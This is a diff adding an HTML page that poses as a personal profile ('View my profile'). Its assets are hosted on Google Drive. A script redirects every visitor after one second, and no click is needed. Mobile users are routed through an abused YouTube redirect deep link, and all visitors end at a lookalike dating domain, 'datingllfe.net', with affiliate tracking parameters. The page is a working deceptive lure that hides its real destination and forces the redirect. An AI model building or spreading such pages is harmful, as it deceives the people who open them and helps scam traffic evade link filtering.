@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://drive.google.com/uc?id=1R1Dfp9TFBR3Iwn37aSHFnuxwpSrF24R2">
+<link rel="icon" href="https://drive.google.com/uc?id=1h7wx4GlHlYHQJ87-mCMteusHs6VagxKY" />
+<link rel="apple-touch-icon" href="https://drive.google.com/uc?id=1BSm8M-1b2cwzbzfDTPPYt9viywkXKy4i" />
+<title>join My Profile</title>
+
+</head>
+
+<body>
+  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
+  <button onclick="myFunction()">View my profile</button>
+<script>
+    setTimeout(function() {
+      myFunction();
+    }, 1000);
+    
+    function myFunction() {
+      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbGVpV0pMSzh6cmVYNzg5bzlrMV9VMGxoMVZ5QXxBQ3Jtc0trV29LdGU2SmY3T0xtT0F6V1I4TG1vM0FLUmxkM0pKemVKSjhHYVdqUHVodXJrekxhRC16THAyOS0wWVlsRjZQQUhsM1VfcHlDTFVfWGhuYW5heXRXcmp1c3h0UG4xTk96NkQwOWJJQWRYSW5Ld1BWWQ&q=https%3A%2F%2Fdgmvbk.datingllfe.net%2F%3Futm_source%3Dda57dc555e50572d%26s1%3D168480%26s2%3D1857563%26s3%3DU%26s5%3DK%26click_id%3DBigo_live%26j5%3D1%26j6%3D1&html_redirect=1";
+      
+      var fallback = "https://dgmvbk.datingllfe.net/?utm_source=da57dc555e50572d&s1=168480&s2=1857563&s3=U&s5=K&click_id=Bigo_live&j5=1&j6=1";
+
+      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+          window.location = app;
+          window.setTimeout(function() {
+              window.location = fallback;
+          }, 25);
+      } else {
+          window.location = fallback;
+      }
+
+      function killPopup() {
+          window.removeEventListener('pagehide', killPopup);
+      }
+
+      window.addEventListener('pagehide', killPopup);
+    }
+</script>
+</body>
+</html>
